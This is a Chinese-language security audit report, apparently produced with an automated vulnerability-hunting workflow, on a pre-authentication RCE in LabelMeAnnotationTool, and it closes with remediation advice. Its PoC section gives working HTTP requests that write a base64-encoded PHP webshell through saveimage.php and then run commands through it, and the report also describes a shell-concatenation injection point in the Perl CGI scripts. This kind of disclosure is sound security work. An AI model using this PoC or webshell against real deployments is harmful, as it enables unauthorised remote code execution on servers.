# LabelMeAnnotationTool 前认证 RCE 漏洞分析报告

- 报告时间：2026-04-02
- 分析目标：`d:\破壳项目\102_CSAILVision_LabelMeAnnotationTool`
- 参考资料：`./漏洞信息/2032383940492517378.pdf`、`./漏洞信息/2032383945617956865.pdf`
- 分析方法：按 `vuln-hunt-memory-driven` 的 pre-auth RCE 策略执行 Source->Sink 链路验证（重点关注免认证入口、文件写入、命令执行）。

## 1. 结论

结论：**存在可利用的前认证 RCE 漏洞（高危）**。

主利用链已确认可行：

1. 未认证用户直接调用 `annotationTools/php/saveimage.php`
2. 利用可控参数实现任意路径文件写入（可写入 Web 可执行目录）
3. 上传 PHP WebShell（或恶意 PHP 脚本）
4. 通过 HTTP 访问写入文件触发代码执行

同时发现一条次级高风险链：

- `fetch_image.cgi` / `fetch_prev_image.cgi` 存在命令拼接执行点（`open(..., "wc -l $fname |")`），具备命令注入语义；直接利用受前置文件存在性检查约束，但在可写文件前提下可达成利用。

---

## 2. 攻击面与认证分析（Pre-auth）

### 2.1 Web 攻击入口（后端脚本）

- `annotationTools/php/saveimage.php`（POST）
- `annotationTools/php/createdir.php`（POST）
- `annotationTools/php/getpackfile.php`（POST）
- `annotationTools/php/encode.php`（POST）
- `annotationTools/perl/submit.cgi`（POST）
- `annotationTools/perl/fetch_image.cgi`（GET）
- `annotationTools/perl/fetch_prev_image.cgi`（GET）
- `annotationTools/perl/write_logfile.cgi`（POST）
- `annotationTools/perl/get_timestamp.cgi`（GET/POST）

### 2.2 认证机制核验

服务端 PHP/Perl 端**未发现会话校验或认证拦截**：

- `annotationTools/js/sign_in.js:9-25`：用户名仅来源于 URL/Cookie，默认 `anonymous`
- `annotationTools/js/globals.js:7`：前端直接指向 `submit.cgi`
- `annotationTools/php/*.php` 与 `annotationTools/perl/*.cgi` 中未见 token/session/auth check

结论：上述入口均可视作前认证可达。

---

## 3. 已确认漏洞链：`saveimage.php` 前认证任意文件写入 -> RCE

## 3.1 Source（外部可控输入）

文件：`annotationTools/php/saveimage.php`（`<global>`）

关键代码：

```php
// annotationTools/php/saveimage.php
if ( isset($_POST["image"]) && !empty($_POST["image"]) ) {
    define('UPLOAD_DIR', $_POST["uploadDir"]);  // 可控路径
    $dataURL = $_POST["image"];                 // 可控内容
    ...
    $file = $TOOLHOME . UPLOAD_DIR . $_POST["name"];  // 可控文件名
    $success = file_put_contents($file, $data);         // 文件写入 sink
}
```

对应行：

- `annotationTools/php/saveimage.php:6`
- `annotationTools/php/saveimage.php:7`
- `annotationTools/php/saveimage.php:9`
- `annotationTools/php/saveimage.php:20`
- `annotationTools/php/saveimage.php:23`

## 3.2 Sink（危险操作）

- `file_put_contents($file, $data)`：将攻击者可控字节流写入攻击者可控路径。

## 3.3 利用链细化

### 步骤 A：前认证调用上传接口

无需登录，直接 POST 到：

- `/annotationTools/php/saveimage.php`

### 步骤 B：构造写入目标为 PHP 可执行目录

通过参数控制：

- `uploadDir=annotationTools/php/`
- `name=shell.php`

写入路径变为：

- `$TOOLHOME/annotationTools/php/shell.php`

### 步骤 C：构造可执行内容

接口对 `image` 只做了 `explode(',', ...)` + `base64_decode`，未做 MIME/扩展名/内容校验：

- 可提交 `data:text/plain;base64,<php_payload_base64>`

### 步骤 D：HTTP 访问落地脚本触发 RCE

- GET `/annotationTools/php/shell.php?c=id`

## 3.4 最小 PoC（示例）

```http
POST /annotationTools/php/saveimage.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

image=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8%2B&uploadDir=annotationTools/php/&name=shell.php
```

随后访问：

```http
GET /annotationTools/php/shell.php?c=whoami HTTP/1.1
Host: target
```

## 3.5 影响

- 远程未认证代码执行（Pre-auth RCE）
- 可完全控制部署用户权限范围内文件/数据
- 可进一步横向移动或持久化

---

## 4. 次级链路：`fetch_image.cgi` / `fetch_prev_image.cgi` 命令拼接风险

文件：

- `annotationTools/perl/fetch_image.cgi`
- `annotationTools/perl/fetch_prev_image.cgi`

关键函数/代码段（均在 `<global>`）：

```perl
my $collection = $query->param("collection");
my $fname = $LM_HOME . "annotationCache/DirLists/$collection.txt";
open(NUMLINES,"wc -l $fname |");
```

对应行：

- `annotationTools/perl/fetch_image.cgi:13`
- `annotationTools/perl/fetch_image.cgi:20/45/70`
- `annotationTools/perl/fetch_image.cgi:27/52/77`
- `annotationTools/perl/fetch_prev_image.cgi:13`
- `annotationTools/perl/fetch_prev_image.cgi:20/45/70`
- `annotationTools/perl/fetch_prev_image.cgi:27/52/77`

分析结论：

- 这里把可控变量拼进 shell 命令字符串，具备命令注入语义。
- 但其前面存在 `open(FP,$fname)` 成功性约束，导致“直接即打”利用门槛较高。
- 在攻击者已具备可写文件能力（例如通过 3 节漏洞）时，此链可进一步被利用。

---

## 5. 与 `./漏洞信息` 报告的交叉验证

PDF 报告已命中：

- `saveimage.php`（代码注入/文件写入风险）
- `getpackfile.php`（上传相关规则命中）

本次复核结果：

- **确认 `saveimage.php` 可形成真实 pre-auth RCE 链。**
- `getpackfile.php` 在当前代码下主要体现为文件打包下载逻辑，未直接构成前认证 RCE 主链。

---

## 6. 修复建议（按优先级）

1. 立即下线或加鉴权 `saveimage.php` / `createdir.php` / `fetch_*` / `submit.cgi` 等写操作接口。
2. `saveimage.php` 强制白名单：
   - 固定写入目录（不可由请求指定）
   - 固定扩展名（仅 `.png`）
   - 校验真实图像格式（如 `getimagesizefromstring`）
   - 拒绝 `..`、绝对路径、路径分隔符穿透
3. 对 Perl 脚本移除 shell 拼接：
   - 禁用 `open(..., "cmd |")` 形式
   - 改为安全 API（或至少严格参数白名单）
4. 在服务端增加统一认证与权限校验（禁止仅靠前端“用户名”逻辑）。
5. Web 服务器层禁止上传目录执行脚本（`php_admin_flag engine off` 或等价策略）。

---

## 7. 漏洞判定

- 判定：**存在前认证 RCE**
- 主漏洞位置：`annotationTools/php/saveimage.php`（`<global>`）
- 主利用链：`POST saveimage.php` -> 任意 PHP 文件写入 -> HTTP 访问执行
- 风险等级：**高危**
